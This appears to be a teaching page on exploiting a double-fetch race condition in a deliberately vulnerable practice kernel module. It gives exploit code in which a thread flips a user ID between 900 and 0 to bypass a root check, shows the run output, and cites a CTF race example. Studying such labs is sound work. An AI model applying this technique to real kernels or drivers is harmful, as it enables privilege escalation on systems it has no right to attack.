---
description: Removing the artificial sleep
---

# Double-Fetch without Sleep

## Overview

In reality, there won't be a 1-second sleep for your race condition to occur. This means we instead have to hope that it occurs in the assembly instructions between the two dereferences!

This will not work every time - in fact, it's quite likely to not work! - so we will instead have **two** loops; one that keeps writing `0` to the ID, and another that writes another value - e.g. `900` - and then calling `write`. The aim is for the thread that switches to `0` to sync up so perfectly that the switch occurs inbetween the ID check and the ID "assignment".

{% file src="../../../.gitbook/assets/double_fetch_no_sleep.zip" %}

## Analysis

If we check the source, we can see that there is no `msleep` any longer:

```c
if (creds->id == 0) {
    printk(KERN_ALERT "[Double-Fetch] Attempted to log in as root!");
    return -1;
}

printk("[Double-Fetch] Attempting login...");

if (!strcmp(creds->password, PASSWORD)) {
    id = creds->id;
    printk(KERN_INFO "[Double-Fetch] Password correct! ID set to %d", id);
    return id;
}
```

## Exploitation

Our exploit is going to look slightly different! We'll create the `Credentials` struct again and set the ID to `900`:

```c
Credentials creds;
creds.id = 900;
strcpy(creds.password, "p4ssw0rd");
```

Then we are going to write this struct to the module repeatedly. We will loop it 1,000,000 times (effectively infinite) to make sure it terminates:

```c
// don't want to make the loop infinite, just in case
for (int i = 0; i < 1000000; i++) {
    // now we write the cred struct to the module
    res_id = write(fd, &creds, 0);

    // if res_id is 0, stop the race
    if (!res_id) {
        puts("[+] ID is 0!");
        break;
    }
}
```

If the ID returned is `0`, we won the race! It is really important to keep in mind exactly what the "success" condition is, and how you can check for it.

Now, in the second thread, we will constantly cycle between ID `900` and `0`. We do this in the hope that it will be `900` on the first dereference, and `0` on the second! I make this loop infinite because it is a thread, and the thread will be killed when the program is (provided you remove `pthread_join()`! Otherwise your main thread will wait forever for the second to stop!).

```c
void *switcher(void *arg) {
    volatile Credentials *creds = (volatile Credentials *)arg;

    while (1) {
        creds->id = 0;
        creds->id = 900;
    }
}
```

Compile the exploit and run it, we get the desired result:

```c
~ $ ./exploit 
FD: 3
[    2.140099] [Double-Fetch] Attempted to log in as root!
[    2.140099] [Double-Fetch] Attempted to log in as root!
[+] ID is 0!
[-] Finished race
```

Look how quick that was! Insane - two fails, then a success!

### Race Analysis

You might be wondering how tight the race window can be for exploitation - well, [`gnote` from TokyoWesterns CTF 2019](https://rpis.ec/blog/tokyowesterns-2019-gnote/) had a race of two assembly instructions:

```
; note that rbx is the buf argument, user-controlled
cmp dword ptr [rbx], 5
ja default_case
mov eax, [rbx]
mov rax, jump_table[rax*8]
jmp rax
```

The dereferences `[rbx]` have just one assembly instruction between, yet we are capable of racing. THAT is just how tight!
